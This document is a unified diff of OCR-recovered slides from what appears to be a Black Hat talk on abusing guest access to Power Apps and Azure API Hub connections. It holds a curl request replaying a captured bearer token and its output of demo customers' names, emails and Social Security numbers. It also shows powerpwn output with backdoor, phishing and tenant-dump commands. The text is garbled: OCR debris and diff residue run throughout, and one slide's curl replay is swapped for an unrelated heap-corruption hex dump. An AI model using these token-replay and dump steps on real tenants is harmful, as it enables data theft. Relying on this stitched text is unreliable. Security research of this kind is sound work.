 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20253
 [dbo].[Customers]
 Search items
 aidenb@zenitydemo.OnMicrosoft.com
 Aiden
 Brown
-alexanderw@zenitydemo.OnMicrosoft.cc
 Alexander
 Gonzalez
 amandas@zenitydemo.OnMicrosoft.com
@@ -2441,16 +2163,13 @@ Kk fo Elements Console Sources Network Performance Memory Application Security
 ®O!\YAa Preserve log Disable cache Nothrotting ¥ “ © &
 -2qsp Invert © Hide data URLs All Fetch/XHR JS CSS Img Media Font Doc WS Wasm Manifest Other
 5000 ms 10000 ms 15000 ms. 20000 ms 25000 ms
-me
 Name
 : Name x Headers Preview
 [) invoke
-D) blob:https://; D invoke General
 Open in new tab quest URL:
 quest Method:
 Clear browser cache bruetCores
 Clear browser cookies mote Address:
-freenr Daline
 Copy >
 Copy link address
 Block request URL Copy response
@@ -2464,29 +2183,22 @@ Save all as HAR with content
 Copy as CURL (bash)
 Override headers
 Copy all as PowerShell
-t
 i Copy all as fetch
 1 Copy all as Node,js fetch
 \ Copy all as CURL (cmd)
 > Copy all as CURL (bash)
 > Copy all as HAR
-aS
 Accept-Encoding:
 Accept-Language: en-US.
 Authorization:
 Bearer
-X-Ms-Apinub-Lacnea-
-RST
 gzip, deflate, br
 30000 ms
 Lighthouse
 Has blocked cookies Blocked Requests
 3rd-party requests
 35000 ms 40000 ms 45000 ms 50000 ms 55000 ms 60000 ms 65000 ms
-§ x-ms-correlation-id,x-ms-user-agent, Strict-Transport-Security,X-Content-Type-Options,X-Frame-Options,Date,x-ms-connection-gateway-object-id,x-ms-
 hing-Allow-Origin,x-ms-apihub-cached-response,x-ms-apihub-obo
-+4650-4c0f-b73d-63c5e8d55b9e)
-eyJOeXAIOUKV1QiLCJhbGciOUSUZI1 Nilsing1dCl6li1LSTNROWSOUjdiUm9meG 1|Wm9YcW)IWkdldylsimtpZCI6li1LSTNROWSOUjdiUm9meG1IlWm9YcW)|WkdldyJ9.eyJndWQiOiJodHRwczovL2FwaWh1YiShenVyZS5jb20iLCJp
 ```
 
 ## Slide 102
@@ -2495,34 +2207,26 @@ eyJOeXAIOUKV1QiLCJhbGciOUSUZI1 Nilsing1dCl6li1LSTNROWSOUjdiUm9meG 1|Wm9YcW)IWkdl
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-pifeK hat
-USA 20e53
-Copy-and-replay browser API Hub
-[ /@mbrg@/BHUSA2023/A11-You-Need-Is-Guest:] $ curl 'https://europe-002.azure-apim.net/invoke'’ \
--X 'POST' \
--H ‘authority: europe-@@2.azure-apim.net' \
--H ‘accept: application/json' \
--H ‘accept-language: en-US' \
--H ‘authorization: Bearer eyJ@eXAi0i JKV1QiLCJhbGci0iJSUZIINiIsIngidCI61i1LSTNROWSOUjdiUm9meG
-"*x-ms-client-object-id: 71bbe90@d-01e9-4d5c-a684-bd5f3967b8aa' \
--H 'x-ms-client-request-id: b@fcb515-3898-496b-af84-89a0058b4f2e' \
--H 'x-ms-client-session-id: 1972191d-bec7-447a-aQac-47267adfec24' \
--H 'x-ms-client-tenant-id: fc993b0f-345b-4d01-9f67-9ac4a140dd43' \
--H 'x-ms-protocol-semantics: cdp' \
--H 'x-ms-request-method: GET’ \
-> -H 'x-ms-request-url: /apim/sql/ff47194e357e459b8756a5F43f59ccc6/v2/datasets/customercareins
-ights.database.windows.net, enterprisecustomers/tables/%255Bdbo%255D.%255BCustomers%255D/items ?%2
-4Morderby=Email+asc&%24select=Email%2CFirstName%2CLastName%2CCustomer ID%2CSocialSecurityNumber&%2
-Mtop=100' \
-> -H 'x-ms-user-agent: PowerApps/3.23072.11 (Web Player; AppName=@1cdeQab-4650-4c@f-b73d-63c5e
-Bd55b9e)" \
-> | --compressed,
-VVVVVVIVV VV V
-1
-=
+Preserving Heap Chunks
+
+82c83f10: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
+82c83f20: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
+82c83f30: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
+82c83f40: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
+82c83f50: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
+82c83f60: 4252 4c59 4252 4c59  4f4f 4f4f 4f4f 4f4f  BRLYBRLYOOOOOOOO
+82c83f70: [obscured]                                 OOOOOOOOXhd0....
+82c83f80: [obscured]                                 ........X.......
+82c83f90: [obscured]                                 prtn....iL......
+82c83fa0: [obscured]                                 (.......(kL.....
+82c83fb0: [obscured]                                 .~........|.....
+82c83fc0: [obscured]                                 ptal....X.......
+
+This IS the object we can corrupt!!
 ```
 
 ## Slide 103
@@ -2531,12 +2235,10 @@ VVVVVVIVV VV V
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
-black hat
-USA 20e53
 Copy-and-replay browser API Hub
 [ /@mbrg@/BHUSA2023/A11-You-Need-Is-
 -X 'POST' \
@@ -2546,8 +2248,6 @@ Copy-and-replay browser API Hub
 -H ‘authorization: Bearer eyJ@e
 >
 >
-ights.database.windows.net, enterpris
-Morderby=Emailt+asc&%24select=Email%2
 MAtop=100' \
 Bd55b9e)' \
 -H 'x-ms-client-object-id: 71bbe
@@ -2558,31 +2258,10 @@ Bd55b9e)' \
 -H 'x-ms-request-method: GET' \
 -H 'x-ms-request-url: /apim/sql
 -H 'x-ms-user-agent: PowerApps/:
---compressed,
 Guest: ] ¢ curl 'httns:// = =ani i |
 {
-"@odata.context":"https://europe-002.azure-apim.net/apim/sql/ff47194e357e459b8756a5F43F59ccc6/
-$metadata#tdatasets('customercareinsights.database.windows.net%2Centerprisecustomers')/tables('%5
-Bdbo%5D.%5BCustomers%5D' )/items", "value": [
 {
-"@odata.etag":"", "ItemInternalId" :"9c849894-b96e-44a2 -962F-2e69686674e7", "Email": "aidenb@z
-enitydemo.OnMicrosoft.com", "FirstName": "Aiden", "LastName": "Brown", "CustomerID" :55677, "SocialSecu
-rityNumber"™ :"209-97-8888"
-hf
-"@odata.etag":"", "ItemInternalId" : "a@fed822-58dd-4#22-a5ea-5ac632008Fb3", "Email": "alexande
-rw@zenitydemo.OnMicrosoft.com", "FirstName": "Alexander", "LastName": "Gonzalez", “CustomerID”: 74321,
-"SocialSecurityNumber"™ :"209-97-9876"
-hf
 "@odata.etag":"", "ItemInternalId":"f1b79F06-ad40-4b2e-a482-d61c820fc5e6", "Email": "amandas@
-zenitydemo.OnMicrosoft.com", "FirstName": "Amanda", "LastName": "Smith", "CustomerID": 78654, "SocialSe
-curityNumber" :"209-97-6666"
-}of
-"@odata.etag":"", "ItemInternalId":"e572c48b-cea5-4461-b83a-9e1f6625220e", "Email": "ameliaj@
-zenitydemo.OnMicrosoft.com", "FirstName": "Amelia", “LastName”: "Johnson", "CustomerID" : 76234, "Social
-SecurityNumber"™ :"209-97-1111"
-hf
-"@odata.etag":"", “ItemInternalId" :"61ced58e-9123-49a9-a37a-8392d6fc761a", "Email": "ameliam@
-zenitydemo.OnMicrosoft.com", "FirstName": "Amelia", "LastName": "Gonzalez", "CustomerID": 74321, "Socia
 ```
 
 ## Slide 104
@@ -2633,20 +2312,16 @@ Power App is using azure-apim.net to fetch connection data GET https://europe-00
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 RESTful API
 defined in
 swagger
-y,
 Power Automate
-Cs
 Power Apps
 Logic Apps
-NN
 docs.microsoft.com
 ```
 
@@ -2656,20 +2331,16 @@ docs.microsoft.com
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-y,
 Power Automate user token
 connector ID
 operation ID
 connection ID
-Ee!
 Power Apps <
 Logic Apps
-x
 docs.microsoft.com
 RESTful API
 defined in
@@ -2682,11 +2353,10 @@ swagger
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 RESTful API
 defined in
 swagger
@@ -2699,7 +2369,6 @@ operation ID
 connection ID
 Power Apps
 Logic Apps
-NN
 docs.microsoft.com
 ```
 
@@ -2709,54 +2378,35 @@ docs.microsoft.com
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 72/100 on the text kept, 46/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA 20e53
-.
-= Y Preserveloy  Diutlecache Notwuning = “Sf 4 5
-toe overt OD Mice ata Uke AME Reich IS CSS. rng Media Fore Doc WE When Maniiest Other C) Mas tocked cooing (1 Scheet Angunets (0) nd-party reqursts
 Let Ss take Nave i Heade
-5 jName * jeaders Preview Re .
-aidenb@zenitydemo.OnMicrosoft.com jo =
 Kidd Open in new tab quest URL: !
 quest Method: ‘
-SR renee aoe stus Code: q
-Clear browser cookies wiohe Agdress j
-alexanderw@zenitydemo.OnMicrosoft.cc am han She comretanan bs cra-uner-agert Sines. Yamport: Secuty X-Cart type Oyeum X-fratre Ouscrn ate s-era connection -patumeny-obyect .s-ere
-nd ow Copy fk adkiress 1 Aon-Crigin ors aps cached reapers me ap bo
 | Block request URL Copy response
 [] Block request domain Copy stack trace
 Replay XHR
-amandas@zenitydemo.OnMicrosoft.com ss
 3 Sort By » Copy as fetch
 Header Ophons. , Copy as Nodes fetch
 Copy as CURL (ord)
 Save all as HAR with content
 Copy 35 CURL (ashy
-z osoft.com Override headers capsids
 y Copy ail as fetch
-: Copy all as Nodeps fetch —_|-au30-acoF brad-tacsem ste)
 \ Copy aif a CURL ford)
 nitydemo.OnMicrosoft.com > Copy all as CURL (hash)
 > Copy af as HAR
-X-ms-apinuo-Lacnea ‘
-Accept treosing ‘tin, dete. be
-cept anger ous
-Aateorsaton tere
-andrewc@zenitydemo.OnMicrosoft.com (ey PORIRUA SNe TICIRE LE TARO SOLA ir eG TTTEDPOAL Wi srt Od TLS TPO SO Je rer Wr CW Wiech che ue ecco ohn TPN
 ```
 
 ## Slide 114
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 ebugger Libraries Introduction s Crafted b' authd
 Encoded Decoded
 HEADER:
@@ -2951,28 +2601,16 @@ How does msft cross-app SSO work? (or – introduction to family of client IDs)
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-USA 2023 “<a
-How does msft cross-app SSO work? (or -
-introduction to family of client IDs)
-secureworks/family-of-
-client-ids-research
-#BHUSA GBlackHatEvents
-```
-
 ## Slide 140
 
 ## How does msft cross-app SSO work? (or introduction to family of client IDs)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 How does msft cross-app SSO work? (or
 introduction to family of client IDs)
 application_name Visual Studio Microsoft Flow
@@ -3001,11 +2639,10 @@ Microsoft Edge
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 How does msft cross-app SSO work? (or
 introduction to family of client IDs)
 application_name Visual Studio Microsoft Flow
@@ -3034,11 +2671,10 @@ Microsoft Edge
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 How does msft cross-app SSO work? (or
 introduction to family of client IDs)
 application_name Visual Studio Microsoft Flow
@@ -3071,18 +2707,6 @@ API Hub token
 
 @mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-piSekhat Da
-USA 20e53
-secureworks/family-of-
-client-ids-research
-Microsoft Azure “sear ino nceumentes Behavior ofAzure A API Hub token
-CLI
-#BHUSA GBlackHatEvents
-```
-
 ## Slide 144
 
 Exchange tokens to win We need to find an AAD app that is:
@@ -3099,28 +2723,15 @@ Exchange tokens to win We need to find an AAD app that is:
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-black hat
-LUISA &U
-And now for the fun part
-@mbrgO
-#BHUSA @BlackHatEvents
-```
-
 ## Slide 146
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 31/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn -h
-P' \ SLNNNAINIS SN CLIC LANNANANV STON
-ll) MW (CO 1\V v7] U/l blo’ \NY v7 ted
 | |_|
 ```
 
@@ -3128,15 +2739,11 @@ ll) MW (CO 1\V v7] U/l blo’ \NY v7 ted
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn -h
-"LVN SLNNNINA SS LN CLI CL NNNINZ JI CLN
-IO MW QQr\v vet _/Pt Plo r\yy vv ttt
-J VS NAN NIL OL NNT LT
 | |
 usage: powerpwn [-h] [-1 LOG_LEVEL] {dump, gui, backdoor,nocodemalware, phishing} ...
 positional arguments:
@@ -3157,17 +2764,11 @@ Configure the logging level.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg®@:/bhusa23/all-you-need-is-guest$ powerpwn -h
-| ° PENNNINITSI LUN CLIC NNN INIT
-LOY vn | |) CAPA
-| . \_/ V/V \_II_I| | . \/\/ ILI II
-|_| |_|
-~---- command
 dump Recon for available data connections and dump their content.
 gui Show collected resources and data via GUI.
 usage backdoor Install a backdoor on the target tenant
@@ -3190,19 +2791,11 @@ Configure the logging level.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn -h
-L'_\V\VAS/| CL
-| |_) CAPA
-Ll
-J_\X\\INJ 7/7
-LOY vn
-f= |_|
-\_/ \/\/ \
 command
 Recon for available data connections and dump their content.
 Show collected resources and data via GUI.
@@ -3226,38 +2819,19 @@ Configure the logging level.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-pifeK hat
-USA 20e53
-P' NV JLNNNINA SS LN CLIC ANNNAVS JCA
-Ply) (OQ) U\V v7 ft L/P} TIO IANY V7 ITE I
-Peas VY VAY NII OE NNT OLLI
-| |
-```
-
 ## Slide 151
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-"LN JSLUNNNINS SSL
-/ \_s \IN/ N
 2023-07-28 11:00:52 | powerpwn |
 token.
 2023-07-28 11:00:52 | powerpwn |
 2023-07-28 11:00:52 | powerpwn |
 To sign in, use a web browser to
-ll) CQO'\vy vest _/t |
-ILI
-I "_\V\VAV/7/[ ‘LN
-ll)I\Vv vis |
-|-/ VAY IL
 |
 INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
 INFO | Failed to acquire with refresh token. Fallback to device-flow
@@ -3269,15 +2843,11 @@ open the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to 
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ powerpwn dump -t fc993b0f-345b-4d01-9f67-9ac4a140dd43
-LL V SLNNNINSSS LN CLIC LNNNANI J CLN
-PIO MW Qt\v vet l/l tT lbli\v ves
-les NY NN NIL NN
 | |
 2023-07-28 11:00:52 | powerpwn | INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
 token.
@@ -3291,22 +2861,15 @@ to authenticate
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-"LN JSLUNNNINS SSL
-/ \_s \IN/ N
 2023-07-28 11:00:52 | powerpwn |
 token.
 2023-07-28 11:00:52 | powerpwn |
 2023-07-28 11:00:52 | powerpwn |
 To sign in, use a web browser to
-ll) CQO'\vy vest _/t |
-ILI
-}'_V\V\A\/V//| ‘AN
-|} I)I\V vis i
 | ._/ \/J/\/ I.
 |
 INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
@@ -3319,27 +2882,23 @@ open the page https://microsoft.com/devicelogin [and enter the code DPCLTUC23 to
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20e53
 Microsoft
 Enter code
 Enter the code displayed on your app or device.
-DPCLTUC23
 ```
 
 ## Slide 155
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Microsoft Azure
 Microsoft
 Pick an account
@@ -3348,7 +2907,6 @@ platform Command Line Interface on another
 device located in Israel. If it's not you, close this
 page.
 Hacker5
-hacker5@pwntoso.onmicrosoft.com
 Signed in
 + Use another account
 Back
@@ -3358,14 +2916,12 @@ Back
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Microsoft Azure
 Microsoft
-hackerS@pwntoso.onmicrosoft.com
 Are you trying to sign in to
 Microsoft Azure CLI?
 Only continue if you downloaded the app from a
@@ -3377,11 +2933,10 @@ Cancel Continue
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 Microsoft
 Microsoft Azure Cross-platform
 Command Line Interface
@@ -3394,23 +2949,15 @@ your device. You may now close this window
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-"LN JSLUNNNINS SSL
-/ \_s \IN/ N
 2023-07-28 11:00:52 | powerpwn |
 token.
 2023-07-28 11:00:52 | powerpwn |
 2023-07-28 11:00:52 | powerpwn |
 To sign in, use a web browser to
-ll) CQO'\vy vest _/t |
-ILI
-I "_\V\VAV/7/[ ‘LN
-ll)I\Vv vis |
-|-/ VAY IL
 |
 INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
 INFO | Failed to acquire with refresh token. Fallback to device-flow
@@ -3422,21 +2969,13 @@ open the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to 
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-"LV SLNNNINSI
-IJ IH QO; \vey
-=
--
 |
 |_|
-//_
 / |
-" A\ANANS/V//|
-,)|\V v/s]
 2023-07-28 11:00:52 |
 token.
 2023-07-28 11:00:52 |
@@ -3446,9 +2985,7 @@ To sign in, use a web
 2023-07-28 11:02:49 |
 2023-07-28 11:02:51 |
 2023-07-28 11:03:06 |
-f-345b-4d01-9f67-9ac4a
 2023-07-28 11:03:07 |
-3b@F-345b-4d01-9F67-9a
 powerpwn | INFO
 powerpwn | INFO
 powerpwn | INFO
@@ -3475,14 +3012,11 @@ the page https://microsoft.com/devicelogin and enter the code DPCLTUC23 to authe
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn dump -t fc993b0f-345b-4d01-9f67-9ac4a14@dd43
-PTV SLNVNANSTS SN
-ll) ()1\V vst _/I I
 |_|
 2023-07-28 11:00:52 | powerpwn |
 token.
@@ -3493,12 +3027,7 @@ To sign in, use a web browser to
 2023-07-28 11:02:49 | powerpwn |
 2023-07-28 11:02:51 | powerpwn |
 2023-07-28 11:03:06 | powerpwn |
-f-345b-4d01-9f67-9ac4a14@dd43
 2023-07-28 11:03:07 | powerpwn |
-3bOF-345b-4d01-9F67 -9ac4al140dd43
-IP 'LV\ANANAZ/|
-|} 1I.)bI\V v/ |
-l. / VANS IL
 INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
 INFO | Failed to acquire with refresh token. Fallback to device-flow
 INFO | Acquiring token with scope=https://service.powerapps.com/.default.
@@ -3514,15 +3043,11 @@ INFO | Found 9 active shareable connections out of 9 connections in environment
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ powerpwn dump -t fc993b@f-345b-4d01-9f67-9ac4a14@dd43
-lb’ \ S.NVV\ANSIS_N!
-ll) ()1\V vst _/i I
-l./ VY VAY VTL
 |_|
 2023-07-28 11:00:52 | powerpwn |
 token.
@@ -3533,15 +3058,8 @@ To sign in, use a web browser to
 2023-07-28 11:02:49 | powerpwn |
 2023-07-28 11:02:51 | powerpwn |
 2023-07-28 11:03:06 | powerpwn |
-f-345b-4d01-9f67-9ac4a140@dd43
 2023-07-28 11:03:07 | powerpwn |
-3bOF-345b-4d01-9F67 -9ac4a140dd43
-~s
-I~
-~s
 a
-~s
-})|\V v/
 |
 INFO | Acquiring token with scope=https://service.powerapps.com/.default from cached refresh
 INFO | Failed to acquire with refresh token. Fallback to device-flow
@@ -3558,12 +3076,10 @@ INFO Found 9 active shareable connections out of 9 connections in environment fc
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-3b@F -345b-4d01-9f67-9ac4a140dd43
 2023-07-28 11:03:07 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azureblob.
 2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurefile.
 2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurequeues.
@@ -3583,12 +3099,10 @@ ne
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-3b@F -345b-4d01-9f67-9ac4a140dd43
 2023-07-28 11:03:07 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azureblob.
 2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurefile.
 2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurequeues.
@@ -3608,12 +3122,10 @@ n.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-3b@F -345b-4d01-9f67-9ac4a140dd43
 2023-07-28 11:03:07 | powerpwn | INFO § Fetching OpenAPI connector shared_azureblob.
 2023-07-28 11:03:08 | powerpwn | INFO |] Fetching OpenAPI connector shared_azurefile.
 2023-07-28 11:03:08 | powerpwn | INFO }]| Fetching OpenAPI connector shared_azurequeues.
@@ -3632,12 +3144,10 @@ n.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20e53
-3b@F -345b-4d01-9f67-9ac4a140dd43
 2023-07-28 11:03:07 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azureblob.
 2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurefile.
 2023-07-28 11:03:08 | powerpwn | INFO | Fetching OpenAPI spec for connector shared_azurequeues.
@@ -3653,21 +3163,18 @@ USA 20e53
 2023-07-28 11:03:10 | powerpwn | INFO | Acquiring token with scope=https://apihub.azure.com/.default from cached refresh toke
 n.
 2023-07-28 11:03:11 | powerpwn | INFO | Token for https: //apihub. azure.com/.default acquired from refresh token successfully.
-2023-07-28 11:03:11 | powerpwn | INFO = ( - esers/bargu/source/mbrg/power -pwn/tokens.json
 | Dump is completed in .cache
 2023-07-28 11:03:24 | powerpwn | INFO
-(.venv) @mbrg@: /bhusa23/all-you-need-iS=s=
 ```
 
 ## Slide 166
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 (.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ ls -.cache
 ```
 
@@ -3675,18 +3182,15 @@ USA 20e53
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 79/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifeK hat
-USA 20e53
 (.venv) @mbrg@: /bhusa23/all-you-need-is-guest$ ls -.cache
 resources
 (.venv) @mbrg@:/bhusa23/all-you-need-is-guest$ ls .cache/resources/Default -fc993b@Ff -345b-4d01-9f67 -9ac4a140dd43/connector/
 shared_azureblob.json shared_flowmanagement.json shared_office365users.json shared_twitter.json
 shared_azurefile.json shared_ftp.json shared_outlooktasks.json shared_yammer.json
